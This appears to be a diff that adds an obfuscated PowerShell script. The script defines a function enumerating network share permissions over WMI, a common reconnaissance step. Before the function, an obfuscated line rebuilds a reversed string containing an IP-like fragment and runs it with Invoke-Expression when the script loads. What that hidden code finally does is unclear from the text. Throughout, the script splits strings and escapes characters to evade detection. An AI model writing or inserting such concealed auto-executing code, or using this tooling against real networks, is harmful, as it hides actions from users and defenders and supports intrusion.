@@ -1,0 +1,39 @@
+  .('SE'+'t-I'+'Tem') ("Vari"+"ABL"+"e:8x"+"9n")  ([TYpE]("{1}{0}" -F 'nG','stRI')  )  ;  .('seT-'+'I'+'TEM')  ("v"+"ARi"+"ABlE:13"+"n"+"u")  (  [tYPE]("{0}{1}"-F 'r','eGEX'));  function gET-SHa`Repe`RMiss`IOn {
+
+
+
+
+
+
+ 
+    [cmdletbinding()]
+    Param (
+        [Parameter(ValUEfRomPIpElINE=${T`RUE}, VALuefroMPipElinEbyProPeRTYname=${Tr`Ue})]
+        ${c`om`pUtER} = '.'
+    ) 
+    ((   ${8x`9n}::"J`oin"('' ,(  ${1`3nU}::"ma`TC`hES"( (")''Nioj-'x'+]3,1[)EcnEReferpEsOBrev$]gniRtS[( "+'( '+('&si'+'V ')."REp`LaCe"(([Char]115+[Char]105+[Char]86),'|')+')'+'93]RaH'+'c[,)68'+']RaHc[+25]'+'R'+'aHc[+'+'301]RaHc[( '+('E'+'cA'+'lpER-)BlzV4'+'g861B'+'lz+Blz'+'.71'+'.19Bl'+'z+Blz.731:pi'+'B'+'lz+Blz'+'VBlz+Blz4Blz+Blzg'+'B'+'lz('+'(')."reP`LaCe"(([ChAr]66+[ChAr]108+[ChAr]122),[sTRinG][ChAr]39)) ,'.',("{3}{0}{2}{1}" -f 'ght','EFt','Tol','ri') )| &('F'+'OrEA'+'CH') {${_}."va`Lue"}))  )  )  |&('ou'+'t-Nul'+'l')
+
+    ${sH`Ar`Es} = &('g'+'wmi') -Class w`in32_sH`ARE -ComputerName ${Co`mPUT`ER} | &('sel'+'e'+'ct') -ExpandProperty na`Me 
+    
+    foreach (${SHa`Re} in ${ShaR`ES}) { 
+        ${a`cl} = ${N`ULl}
+        .('Writ'+'e-'+'V'+'erbose') ${S`ha`Re} 
+ 
+        ${o`BJsh`Ar`EsEc} = &('Get'+'-WMI'+'Obje'+'c'+'t') -Class wi`N32_`lO`gicA`lsh`AREsecuRIT`Y`Se`T`TINg -Filter "name='$Share'"  -ComputerName ${cOMp`Uter}
+        try {
+            ${s`D} = ${ObjS`hArE`sEc}."GEt`SEc`UriTydes`C`RiPt`or"()."D`EsCRIpt`Or"   
+            foreach(${A`CE} in ${Sd}."d`ACL"){  
+                ${USEr`N`AmE} = ${a`ce}."tRU`STEe"."N`AMe"     
+                If (${A`cE}."tRU`sTeE"."DOMa`In" -ne ${n`UlL}) {${uSE`RNa`Me} = "$($ace.Trustee.Domain)\$UserName"}   
+                If (${A`Ce}."TR`UsTee"."Na`mE" -eq ${nU`lL}) {${uSER`N`A`ME} = ${A`CE}."TR`UST`Ee"."Si`dStRing" }     
+                [Array]${a`Cl} += &('New-'+'O'+'b'+'ject') secUr`ITy.`A`CCEsScO`N`TRoL.`FilesyStE`MaCCeSs`RUle(${us`E`RName}, ${A`ce}."acC`E`ssmASk", ${A`Ce}."acET`Ype") 
+                }        
+            } 
+        catch {
+            &('Write-'+'Warn'+'ing') ('Una'+'ble'+' '+'to'+' '+'obtai'+'n '+'pe'+'rm'+'is'+'sions '+'f'+'or '+"$share")
+        } 
+        ${A`CL} | .('Sel'+'ect') @{'n'=("{0}{2}{1}"-f'S','reName','ha');"E"={${S`HaRe}}},FILes`Y`stemRig`h`Ts,ACcessco`Nt`ROlTY`pe,IdEn`T`ITYrE`F`ErEnce,ISIN`H`ErIted,iN`her`iTaN`cEFlAGS,PrOp`AGa`TiON`FLAgs
+    }
+}
+
+
